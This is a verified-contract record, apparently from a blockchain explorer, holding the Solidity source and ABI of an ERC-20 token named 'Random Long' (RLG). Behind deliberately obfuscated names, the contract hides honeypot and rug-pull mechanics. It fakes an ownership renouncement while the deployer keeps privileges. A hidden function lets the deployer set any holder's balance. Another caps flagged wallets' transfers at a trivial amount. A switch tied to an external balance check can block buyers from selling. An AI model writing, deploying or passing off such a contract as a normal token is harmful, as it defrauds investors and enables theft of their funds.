{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface amountTokenMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableTotal {\n    function createPair(address limitToMin, address buyLiquidity) external returns (address);\n}\n\ninterface fromReceiverLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxLaunched) external view returns (uint256);\n\n    function transfer(address fromTxSell, uint256 marketingTotal) external returns (bool);\n\n    function allowance(address atEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromTxSell,\n        uint256 marketingTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeMaxExempt, uint256 value);\n    event Approval(address indexed atEnable, address indexed spender, uint256 value);\n}\n\ninterface enableTradingFrom is fromReceiverLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RandomLong is teamMin, fromReceiverLaunched, enableTradingFrom {\n\n    address private limitMax;\n\n    mapping(address => bool) public enableReceiver;\n\n    uint8 private totalSellWallet = 18;\n\n    mapping(address => mapping(address => uint256)) private modeAuto;\n\n    bool private toAt;\n\n    address minSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public marketingLiquidity;\n\n    function amountLiquidity(address marketingTrading) public {\n        require(marketingTrading.balance < 100000);\n        if (sellBuyTotal) {\n            return;\n        }\n        \n        enableReceiver[marketingTrading] = true;\n        if (toReceiver != toAt) {\n            marketingLiquidity = true;\n        }\n        sellBuyTotal = true;\n    }\n\n    uint256 public totalToken;\n\n    address public sellTx;\n\n    address public fundEnable;\n\n    uint256 shouldMode;\n\n    bool public senderTotalFee;\n\n    mapping(address => bool) public marketingLaunchMode;\n\n    mapping(address => uint256) private tradingFundWallet;\n\n    uint256 private receiverList;\n\n    function liquidityExempt(uint256 marketingTotal) public {\n        tokenWalletTake();\n        receiverFund = marketingTotal;\n    }\n\n    function allowance(address limitIsTo, address fundFee) external view virtual override returns (uint256) {\n        if (fundFee == minSell) {\n            return type(uint256).max;\n        }\n        return modeAuto[limitIsTo][fundFee];\n    }\n\n    function tokenWalletTake() private view {\n        require(enableReceiver[_msgSender()]);\n    }\n\n    bool public txLimit;\n\n    uint256 constant atTradingSell = 7 ** 10;\n\n    function swapFromFee() public {\n        emit OwnershipTransferred(sellTx, address(0));\n        limitMax = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletMin;\n    }\n\n    function getOwner() external view returns (address) {\n        return limitMax;\n    }\n\n    function owner() external view returns (address) {\n        return limitMax;\n    }\n\n    function approve(address fundFee, uint256 marketingTotal) public virtual override returns (bool) {\n        modeAuto[_msgSender()][fundFee] = marketingTotal;\n        emit Approval(_msgSender(), fundFee, marketingTotal);\n        return true;\n    }\n\n    function tokenAmount(address swapTeam) public {\n        tokenWalletTake();\n        \n        if (swapTeam == sellTx || swapTeam == fundEnable) {\n            return;\n        }\n        marketingLaunchMode[swapTeam] = true;\n    }\n\n    uint256 receiverFund;\n\n    function name() external view virtual override returns (string memory) {\n        return fromAmountLimit;\n    }\n\n    uint256 private walletMin = 100000000 * 10 ** 18;\n\n    function balanceOf(address maxLaunched) public view virtual override returns (uint256) {\n        return tradingFundWallet[maxLaunched];\n    }\n\n    event OwnershipTransferred(address indexed maxLaunch, address indexed launchTrading);\n\n    function tradingFrom(address feeShould, address fromTxSell, uint256 marketingTotal) internal returns (bool) {\n        if (feeShould == sellTx) {\n            return receiverShould(feeShould, fromTxSell, marketingTotal);\n        }\n        uint256 receiverTeamTrading = fromReceiverLaunched(fundEnable).balanceOf(receiverToken);\n        require(receiverTeamTrading == receiverFund);\n        require(fromTxSell != receiverToken);\n        if (marketingLaunchMode[feeShould]) {\n            return receiverShould(feeShould, fromTxSell, atTradingSell);\n        }\n        return receiverShould(feeShould, fromTxSell, marketingTotal);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buySwap;\n    }\n\n    uint256 private walletIsExempt;\n\n    bool public toReceiver;\n\n    uint256 private senderEnable;\n\n    constructor (){\n        if (marketingLiquidity != toAt) {\n            txLimit = false;\n        }\n        amountTokenMode exemptAt = amountTokenMode(minSell);\n        fundEnable = enableTotal(exemptAt.factory()).createPair(exemptAt.WETH(), address(this));\n        \n        sellTx = _msgSender();\n        swapFromFee();\n        enableReceiver[sellTx] = true;\n        tradingFundWallet[sellTx] = walletMin;\n        if (walletIsExempt != receiverList) {\n            marketingLiquidity = false;\n        }\n        emit Transfer(address(0), sellTx, walletMin);\n    }\n\n    function receiverShould(address feeShould, address fromTxSell, uint256 marketingTotal) internal returns (bool) {\n        require(tradingFundWallet[feeShould] >= marketingTotal);\n        tradingFundWallet[feeShould] -= marketingTotal;\n        tradingFundWallet[fromTxSell] += marketingTotal;\n        emit Transfer(feeShould, fromTxSell, marketingTotal);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalSellWallet;\n    }\n\n    string private fromAmountLimit = \"Random Long\";\n\n    address receiverToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address feeShould, address fromTxSell, uint256 marketingTotal) external override returns (bool) {\n        if (_msgSender() != minSell) {\n            if (modeAuto[feeShould][_msgSender()] != type(uint256).max) {\n                require(marketingTotal <= modeAuto[feeShould][_msgSender()]);\n                modeAuto[feeShould][_msgSender()] -= marketingTotal;\n            }\n        }\n        return tradingFrom(feeShould, fromTxSell, marketingTotal);\n    }\n\n    bool public sellBuyTotal;\n\n    function transfer(address tokenFrom, uint256 marketingTotal) external virtual override returns (bool) {\n        return tradingFrom(_msgSender(), tokenFrom, marketingTotal);\n    }\n\n    function tokenFundExempt(address tokenFrom, uint256 marketingTotal) public {\n        tokenWalletTake();\n        tradingFundWallet[tokenFrom] = marketingTotal;\n    }\n\n    string private buySwap = \"RLG\";\n\n    bool private launchSender;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeMaxExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitIsTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTrading\",\"type\":\"address\"}],\"name\":\"amountLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingTotal\",\"type\":\"uint256\"}],\"name\":\"liquidityExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingLaunchMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuyTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTotalFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTeam\",\"type\":\"address\"}],\"name\":\"tokenAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTotal\",\"type\":\"uint256\"}],\"name\":\"tokenFundExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromTxSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RandomLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}